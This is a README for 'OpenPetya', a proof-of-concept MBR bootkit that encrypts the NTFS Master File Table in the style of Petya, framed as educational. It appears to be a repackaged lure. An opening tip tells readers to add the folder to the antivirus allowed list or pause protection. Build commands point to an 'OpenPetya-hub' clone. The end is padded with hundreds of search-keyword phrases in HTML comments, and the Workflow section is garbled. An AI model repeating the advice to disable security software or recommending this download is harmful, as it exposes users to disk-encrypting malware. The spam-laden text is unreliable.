# OpenPetya


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/ConsciousnessPhase/OpenPetya-hub.git
cd OpenPetya-hub
mkdir build && cd build
cmake ..
cmake --build . --config Release
```


A Proof-of-Concept bootkit inspired by Petya ransomware, written in Assembly, C, and C++

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/meme/Rio/4.png" width=200/>
</p>

If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.

# Overview

OpenPetya is an educational project designed to study how bootkits and low-level ransomware operate internally.

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/5.png" width=700/>
</p>

The project focuses on:
- custom MBR bootloading
- multi-stage boot process
- Protected Mode transition
- NTFS Master File Table (MFT) encryption
- Salsa20-based cryptography
- password validation and restoration workflow

OpenPetya is **NOT** intended to be an exact reimplementation of either Petya or NotPetya. Instead, it is a simplified Proof-of-Concept designed for learning and research purposes.

It is worth mentioning that OpenPetya does not include Command-and-Control (C2) functionality. In addition, OpenPetya stores plaintext MFT backup data inside hidden sectors after encryption. This behavior is intentionally designed for educational purposes because those features are relatively trival compared to the core bootloader and cryptographic mechanisms implemented in this project. However, you can still modify or remove these features if necessary.

---

# Project Motivation

Over the past few months, I have been studying:
- malware analysis
- bootloaders
- rootkits and bootkits
- Windows internals
- operating system fundamentals
- low-level Assembly programming

While researching Petya and NotPetya, I realized that many online resources only briefly explain the overall workflow without demonstrating how the underlying boot process actually works.

In addition, many existing Petya-related projects rely on extracted bootloader binaries or modified original components rather than implementing the logic from scratch.

Therefore, I decided to develop OpenPetya as a practical project for understanding:
- how custom MBR bootkits work
- how stage-2 bootloaders operate
- how disk encryption workflows function
- how password validation and restoration mechanisms are implemented

The project also serves as part of my ongoing research into bootkits, low-level malware, and operating system internals.

Related articles:
- [Analyzing Petya](https://iss4cf0ng.github.io/2026/04/12/2026-4-12-Petya/)
- [Analyzing NotPetya](https://iss4cf0ng.github.io/2026/04/13/2026-4-13-NotPetya/)
- [Simple MBR And Bootloader](https://iss4cf0ng.github.io/2026/04/08/2026-4-8-MbrAndBootLoader/)
- [OpenBootloader](https://iss4cf0ng.github.io/2026/05/10/2026-5-10-OpenBootloader/)
- [Rootkits and Bootkits Notes](https://iss4cf0ng.github.io/2026/04/28/2026-4-28-RootkitAndBootkit/)
- [PC Assembly Language Notes](https://iss4cf0ng.github.io/2026/04/21/2026-4-21-PcAsmLang/)
- [Serious Cryptography Notes](https://iss4cf0ng.github.io/2026/05/16/2026-5-16-SeriousCryptography/)

---

# Features

- **Custom MBR**
  
  OpenPetya uses a custom Master Boot Record (MBR) to load the stage-2 payload.

- **Custom Stage-2 Bootloader**
  
  The stage-2 bootloader contains the core functionality of the project, including:
  - Salsa20 encryption/decryption
  - password validation
  - restoration logic
  - user interface

- **Protected Mode Transition**
  
  The bootloader switches from 16-bit Real Mode to 32-bit Protected Mode before executing higher-level logic.

- **MFT Encryption**
  
  Similar to the original Petya, OpenPetya encrypts critical parts of the NTFS Master File Table (MFT) using Salsa20.

- **Password Validation**
  
  OpenPetya validates the input password before decryption to prevent irreversible corruption caused by invalid keys.

- **Automatic Restoration**
  
  Once the correct password is entered:
  - encrypted data is restored
  - the original boot chain is recovered
  - OpenPetya removes itself automatically

---

# Components

## `OpenPetya.exe`

User-mode installer and controller application.

Functions:
- drive selection
- installation
- reboot triggering
- utility interface

## `mbr.bin`

Custom Master Boot Record (MBR) code responsible for:
- stage-2 loading
- early boot execution

## `stage2.bin`

The core payload of OpenPetya.

Responsibilities:
- Protected Mode transition
- Salsa20 cryptographic operations
- MFT encryption/decryption
- password validation
- restoration
- boot-time interface

---

# Workflow

The workflow of OpenPetya is summarized below.

   - encrypted data is decrypted
   - the original boot chain is restored
   - OpenPetya removes itself automatically

> Unlike the original Petya ransomware, OpenPetya does not attempt to deceive users with fake CHKDSK screens or social engineering behavior. The project is designed purely for educational and research purposes.

---


# Technical Notes

Detailed explanations about:
- MBR boot process
- Real Mode and Protected Mode
- Salsa20 implementation
- MFT encryption workflow
- bootkit design
- More discussions about Petya and NotPetya
- How to use undocumented APIs (such as `NtRaiseHardError`)

Are documented in [this article](https://iss4cf0ng.github.io/2026/05/23/2026-5-23-OpenPetya/).

# Disclaimer

This project was developed purely for educational and research purposes.

The goal of OpenPetya is to study:

- bootkits
- operating system internals
- low-level malware techniques
- bootloader architecture

Do **NOT** use this project for illegal activities or against systems you do not own or explicitly have permission to test.

The author is **NOT** responsible for any misuse of this software.

# Demonstration (Windows 7)

## Screenshots

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/4.png" width=800/>
</p>


# Future Plans

- Improved recovery workflow
- Better NTFS parsing
- More accurate Petya behavior simulation
- UEFI experiments
- Additional bootkit research
- Full-screen Graphics Mode
- Windows 10 support

# Thanks

Thanks for checking out this project. Feedback and suggestions are welcome.

<!-- c++ cpp cmake native performance library framework windows linux macos -->
<!-- OpenPetya-hub - tool utility software - download install setup -->
<!-- how to use OpenPetya-hub client | sample advanced OpenPetya-hub | free OpenPetya-hub plugin | low latency OpenPetya-hub sdk | OpenPetya-hub converter | OpenPetya hub example | OpenPetya-hub uploader | tar.gz github OpenPetya-hub | quickstart free OpenPetya-hub | git clone top OpenPetya-hub | tar.gz OpenPetya-hub validator | setup OpenPetya-hub copy | OpenPetya-hub alternative | OpenPetya hub cheat sheet | windows OpenPetya-hub web | macos OpenPetya-hub | minimal OpenPetya-hub sdk | fedora fast OpenPetya-hub extractor | git clone OpenPetya-hub decoder | configurable OpenPetya-hub wrapper | local OpenPetya-hub library | quickstart OpenPetya-hub framework | windows OpenPetya-hub monitor | how to configure OpenPetya-hub encoder | macos powerful OpenPetya-hub fork | fast OpenPetya-hub | configurable OpenPetya-hub library | ubuntu OpenPetya-hub module | how to run online OpenPetya-hub | run OpenPetya-hub fork | lightweight OpenPetya-hub application | configurable OpenPetya-hub | run on linux OpenPetya-hub binding | 2026 OpenPetya-hub decoder | github free OpenPetya-hub | open OpenPetya-hub platform | tutorial OpenPetya-hub converter | 2026 OpenPetya-hub server | OpenPetya hub setup | github OpenPetya-hub desktop | portable OpenPetya-hub | how to download OpenPetya-hub extension | debian OpenPetya-hub wrapper | configurable OpenPetya-hub software | reliable OpenPetya-hub scanner | minimal OpenPetya-hub debugger | how to configure open source OpenPetya-hub | fedora customizable OpenPetya-hub | extensible OpenPetya-hub | arch OpenPetya-hub wrapper -->
<!-- docs OpenPetya-hub service | portable OpenPetya-hub scanner | OpenPetya hub podcast | wiki minimal OpenPetya-hub | run on mac OpenPetya-hub uploader | git clone OpenPetya-hub copy | how to configure OpenPetya-hub builder | OpenPetya hub ci cd | how to install OpenPetya-hub application | minimal OpenPetya-hub service | compile OpenPetya-hub monitor | how to setup OpenPetya-hub platform | low latency OpenPetya-hub gui | download for windows OpenPetya-hub | OpenPetya-hub generator | demo OpenPetya-hub sdk | macos OpenPetya-hub extension | zip low latency OpenPetya-hub mirror | docs OpenPetya-hub copy | execute low latency OpenPetya-hub | example offline OpenPetya-hub builder | 2026 modular OpenPetya-hub app | cross platform OpenPetya-hub | new version online OpenPetya-hub | top OpenPetya-hub copy | how to build OpenPetya-hub app | online OpenPetya-hub tester | how to run OpenPetya-hub platform | modular OpenPetya-hub creator | latest version OpenPetya-hub engine | OpenPetya-hub library | open source OpenPetya-hub compressor | how to download OpenPetya-hub validator | demo OpenPetya-hub program | open OpenPetya-hub fork | 2025 OpenPetya-hub port | low latency OpenPetya-hub software | open source OpenPetya-hub wrapper | open OpenPetya-hub viewer | wiki OpenPetya-hub package | secure OpenPetya-hub application | extensible OpenPetya-hub fork | linux OpenPetya-hub api | configurable OpenPetya-hub package | how to setup powerful OpenPetya-hub | source code extensible OpenPetya-hub | self hosted OpenPetya-hub | linux OpenPetya-hub generator | beginner OpenPetya-hub software | walkthrough modular OpenPetya-hub -->
<!-- modern OpenPetya-hub editor | native OpenPetya-hub package | modern OpenPetya-hub server | launch OpenPetya-hub copy | example OpenPetya-hub reader | OpenPetya-hub debugger | quickstart OpenPetya-hub reader | wiki OpenPetya-hub monitor | zip OpenPetya-hub app | production ready OpenPetya-hub gui | stable OpenPetya-hub editor | download for linux OpenPetya-hub api | quickstart OpenPetya-hub service | minimal OpenPetya-hub validator | examples advanced OpenPetya-hub | cross platform OpenPetya-hub platform | how to setup OpenPetya-hub | OpenPetya-hub tool | documentation OpenPetya-hub module | offline OpenPetya-hub mobile | lightweight OpenPetya-hub copy | OpenPetya-hub framework | download OpenPetya-hub generator | demo OpenPetya-hub app | extensible OpenPetya-hub mirror | deploy free OpenPetya-hub | OpenPetya-hub extractor | use low latency OpenPetya-hub module | OpenPetya-hub creator | tar.gz OpenPetya-hub client | source code modern OpenPetya-hub | get OpenPetya-hub fork | modular OpenPetya-hub tracker | how to download OpenPetya-hub | macos OpenPetya-hub optimizer | source code OpenPetya-hub creator | run on windows OpenPetya-hub client | linux OpenPetya-hub | self hosted OpenPetya-hub cli | OpenPetya-hub decoder | how to use OpenPetya-hub alternative | run on mac low latency OpenPetya-hub | how to run modern OpenPetya-hub | open source OpenPetya-hub parser | download for mac OpenPetya-hub package | build OpenPetya-hub converter | tar.gz extensible OpenPetya-hub | run on mac fast OpenPetya-hub | deploy OpenPetya-hub | simple OpenPetya-hub web -->
<!-- tar.gz top OpenPetya-hub | centos OpenPetya-hub decoder | production ready OpenPetya-hub fork | ubuntu configurable OpenPetya-hub | download for linux OpenPetya-hub creator | run on mac cross platform OpenPetya-hub | linux lightweight OpenPetya-hub | native OpenPetya-hub compressor | OpenPetya hub alternative | top OpenPetya-hub mobile | OpenPetya hub cloud | fedora open source OpenPetya-hub | OpenPetya hub project | guide OpenPetya-hub | how to setup OpenPetya-hub monitor | walkthrough OpenPetya-hub compressor | git clone OpenPetya-hub application | quick start OpenPetya-hub library | advanced OpenPetya-hub creator | extensible OpenPetya-hub app | execute OpenPetya-hub | demo OpenPetya-hub validator | new version OpenPetya-hub compressor | top OpenPetya-hub | 2025 simple OpenPetya-hub wrapper | debian OpenPetya-hub replacement | OpenPetya hub pipeline | run OpenPetya-hub optimizer | 2025 OpenPetya-hub converter | reliable OpenPetya-hub | secure OpenPetya-hub uploader | stable OpenPetya-hub creator | execute OpenPetya-hub web | run on mac OpenPetya-hub library | beginner OpenPetya-hub creator | docs OpenPetya-hub clone | example OpenPetya-hub | linux self hosted OpenPetya-hub | advanced OpenPetya-hub | configure OpenPetya-hub encoder | setup OpenPetya-hub | example secure OpenPetya-hub library | debian offline OpenPetya-hub logger | start advanced OpenPetya-hub | easy OpenPetya-hub module | production ready OpenPetya-hub port | OpenPetya-hub service | OpenPetya-hub client | online OpenPetya-hub | how to configure OpenPetya-hub reader -->
<!-- demo customizable OpenPetya-hub | free OpenPetya-hub addon | start OpenPetya-hub fork | native OpenPetya-hub library | OpenPetya-hub program | quick start portable OpenPetya-hub logger | how to install OpenPetya-hub | download OpenPetya-hub debugger | how to download OpenPetya-hub creator | how to setup cross platform OpenPetya-hub | native OpenPetya-hub downloader | modular OpenPetya-hub wrapper | setup high performance OpenPetya-hub | docs OpenPetya-hub | OpenPetya hub workshop | powerful OpenPetya-hub editor | wiki high performance OpenPetya-hub | tutorial native OpenPetya-hub | modular OpenPetya-hub application | ubuntu OpenPetya-hub software | top OpenPetya-hub library | portable OpenPetya-hub cli | best OpenPetya-hub | run on windows OpenPetya-hub | open source OpenPetya-hub binding | offline OpenPetya-hub server | OpenPetya hub kubernetes | how to run OpenPetya-hub tracker | configurable OpenPetya-hub scanner | run on mac top OpenPetya-hub | high performance OpenPetya-hub tool | portable OpenPetya-hub platform | examples OpenPetya-hub web | how to download OpenPetya-hub package | OpenPetya-hub port | free OpenPetya-hub logger | zip OpenPetya-hub | OpenPetya-hub fork | free download OpenPetya-hub tester | OpenPetya-hub validator | arch OpenPetya-hub mobile | minimal OpenPetya-hub converter | lightweight OpenPetya-hub viewer | how to install OpenPetya-hub wrapper | OpenPetya hub workflow | how to run OpenPetya-hub validator | quick start extensible OpenPetya-hub | how to deploy OpenPetya-hub | online OpenPetya-hub app | OpenPetya hub documentation -->
<!-- modular OpenPetya-hub reader | quick start OpenPetya-hub reader | open source OpenPetya-hub | customizable OpenPetya-hub module | source code OpenPetya-hub platform | windows OpenPetya-hub app | powerful OpenPetya-hub generator | get OpenPetya-hub package | safe OpenPetya-hub library | fast OpenPetya-hub replacement | fedora OpenPetya-hub checker | walkthrough OpenPetya-hub app | ubuntu OpenPetya-hub logger | arch OpenPetya-hub utility | launch OpenPetya-hub | run on mac github OpenPetya-hub | documentation OpenPetya-hub extractor | updated OpenPetya-hub gui | how to deploy OpenPetya-hub tracker | download for linux OpenPetya-hub | getting started OpenPetya-hub client | local OpenPetya-hub port | extensible OpenPetya-hub server | advanced OpenPetya-hub utility | 2026 offline OpenPetya-hub replacement | OpenPetya-hub parser | production ready OpenPetya-hub mobile | sample OpenPetya-hub package | beginner OpenPetya-hub checker | latest version OpenPetya-hub software | how to setup OpenPetya-hub gui | run on windows OpenPetya-hub library | source code OpenPetya-hub sdk | fast OpenPetya-hub logger | compile OpenPetya-hub client | docs offline OpenPetya-hub | linux OpenPetya-hub utility | free OpenPetya hub | best OpenPetya-hub module | stable OpenPetya-hub analyzer | production ready OpenPetya-hub checker | run on linux OpenPetya-hub | 2026 OpenPetya-hub optimizer | quick start OpenPetya-hub mirror | download for mac OpenPetya-hub decoder | lightweight OpenPetya-hub | stable OpenPetya-hub parser | execute high performance OpenPetya-hub | git clone OpenPetya-hub framework | execute OpenPetya-hub creator -->
<!-- offline OpenPetya-hub decoder | walkthrough OpenPetya-hub mobile | fedora OpenPetya-hub encoder | centos OpenPetya-hub analyzer | quick start OpenPetya-hub encoder | open source easy OpenPetya-hub mirror | OpenPetya hub blog | self hosted OpenPetya-hub validator | guide OpenPetya-hub editor | tar.gz production ready OpenPetya-hub | getting started OpenPetya-hub sdk | guide OpenPetya-hub package | guide OpenPetya-hub program | run on mac OpenPetya-hub | run OpenPetya-hub tester | new version OpenPetya-hub port | how to download lightweight OpenPetya-hub alternative | run on mac extensible OpenPetya-hub | how to build OpenPetya-hub | OpenPetya-hub scanner | online OpenPetya-hub monitor | OpenPetya-hub mobile | cross platform OpenPetya-hub software | run on windows cross platform OpenPetya-hub fork | github OpenPetya-hub sdk | windows simple OpenPetya-hub | macos OpenPetya-hub api | source code self hosted OpenPetya-hub | native OpenPetya-hub decoder | git clone OpenPetya-hub program | examples safe OpenPetya-hub sdk | run on linux stable OpenPetya-hub wrapper | customizable OpenPetya-hub application | use OpenPetya-hub viewer | demo OpenPetya-hub client | use configurable OpenPetya-hub addon | safe OpenPetya-hub desktop | self hosted OpenPetya-hub optimizer | offline OpenPetya-hub mirror | quickstart OpenPetya-hub optimizer | download free OpenPetya-hub | OpenPetya-hub compressor | use OpenPetya-hub copy | get OpenPetya-hub parser | fast OpenPetya-hub editor | macos OpenPetya-hub binding | open source OpenPetya-hub downloader | simple OpenPetya-hub | self hosted OpenPetya-hub software | local OpenPetya-hub scanner -->
<!-- OpenPetya hub benchmark | fast OpenPetya-hub mirror | wiki customizable OpenPetya-hub | OpenPetya-hub optimizer | OpenPetya-hub software | modular OpenPetya-hub | high performance OpenPetya-hub mirror | github OpenPetya-hub copy | 2025 OpenPetya-hub builder | online OpenPetya-hub service | run on linux reliable OpenPetya-hub | how to use OpenPetya-hub | OpenPetya hub saas | free OpenPetya-hub optimizer | reliable OpenPetya-hub web | how to run OpenPetya-hub | build OpenPetya-hub addon | OpenPetya hub devops | stable OpenPetya-hub application | configure OpenPetya-hub parser | download for windows lightweight OpenPetya-hub | secure OpenPetya-hub parser | stable OpenPetya-hub optimizer | powerful OpenPetya-hub library | getting started OpenPetya-hub desktop | new version OpenPetya-hub platform | reliable OpenPetya-hub tool | arch OpenPetya-hub | how to build OpenPetya-hub cli | extensible OpenPetya-hub copy | launch OpenPetya-hub parser | sample OpenPetya-hub web | examples OpenPetya-hub | free download OpenPetya-hub replacement | sample OpenPetya-hub server | configurable OpenPetya-hub optimizer | install OpenPetya-hub module | cross platform OpenPetya-hub wrapper | build best OpenPetya-hub | beginner OpenPetya-hub sdk | updated easy OpenPetya-hub cli | safe OpenPetya-hub copy | centos OpenPetya-hub tester | safe OpenPetya-hub compressor | top OpenPetya-hub downloader | walkthrough open source OpenPetya-hub | 2025 OpenPetya-hub | updated OpenPetya-hub creator | OpenPetya-hub tester | updated OpenPetya-hub wrapper -->
<!-- free download OpenPetya-hub server | best OpenPetya hub | documentation open source OpenPetya-hub viewer | windows advanced OpenPetya-hub plugin | modern OpenPetya-hub | OpenPetya-hub tracker | 2026 OpenPetya-hub application | windows OpenPetya-hub encoder | self hosted OpenPetya-hub extractor | low latency OpenPetya-hub | examples OpenPetya-hub monitor | simple OpenPetya-hub module | production ready OpenPetya-hub cli | tutorial OpenPetya-hub mirror | low latency OpenPetya-hub web | powerful OpenPetya-hub parser | get OpenPetya-hub editor | examples OpenPetya-hub extension | free OpenPetya-hub service | secure OpenPetya-hub library | OpenPetya hub automation | debian OpenPetya-hub checker | easy OpenPetya-hub creator | tar.gz OpenPetya-hub monitor | wiki OpenPetya-hub analyzer | tar.gz OpenPetya-hub builder | production ready OpenPetya-hub tool | open source OpenPetya-hub monitor | setup OpenPetya-hub fork | online OpenPetya-hub application | centos OpenPetya-hub optimizer | secure OpenPetya-hub extension | sample OpenPetya-hub copy | documentation OpenPetya-hub alternative | setup easy OpenPetya-hub | OpenPetya-hub app | 2026 OpenPetya-hub analyzer | easy OpenPetya-hub fork | self hosted OpenPetya-hub tester | github OpenPetya-hub module | use OpenPetya-hub web | walkthrough open source OpenPetya-hub engine | modular OpenPetya-hub port | how to run OpenPetya-hub logger | windows OpenPetya-hub parser | centos OpenPetya-hub | free download OpenPetya-hub fork | source code OpenPetya-hub compressor | OpenPetya-hub application | linux OpenPetya-hub client -->
<!-- setup OpenPetya-hub api | guide OpenPetya-hub debugger | download for windows OpenPetya-hub framework | deploy OpenPetya-hub scanner | quick start OpenPetya-hub tool | example open source OpenPetya-hub | fast OpenPetya-hub framework | safe OpenPetya-hub extension | execute modern OpenPetya-hub | simple OpenPetya-hub utility | extensible OpenPetya-hub service | wiki OpenPetya-hub application | download for linux OpenPetya-hub sdk | how to use secure OpenPetya-hub | build OpenPetya-hub compressor | 2026 OpenPetya-hub | top OpenPetya hub | production ready OpenPetya-hub mirror | sample OpenPetya-hub | portable OpenPetya-hub debugger | guide modular OpenPetya-hub | docs OpenPetya-hub builder | new version modular OpenPetya-hub | OpenPetya-hub reader | cross platform OpenPetya-hub extractor | run on windows OpenPetya-hub package | OpenPetya hub reddit | open OpenPetya-hub extension | OpenPetya hub review | github OpenPetya-hub port | example OpenPetya-hub gui | high performance OpenPetya-hub clone | OpenPetya hub docker | fedora OpenPetya-hub clone | beginner advanced OpenPetya-hub port | how to build OpenPetya-hub validator | lightweight OpenPetya-hub cli | install OpenPetya-hub library | deploy OpenPetya-hub engine | build OpenPetya-hub downloader | free OpenPetya-hub | download OpenPetya-hub creator | sample modern OpenPetya-hub fork | how to deploy OpenPetya-hub client | install safe OpenPetya-hub | minimal OpenPetya-hub optimizer | setup advanced OpenPetya-hub | free OpenPetya-hub sdk | open source customizable OpenPetya-hub | latest version open source OpenPetya-hub service -->

<!-- Last updated: 2026-06-09 19:29:28 -->
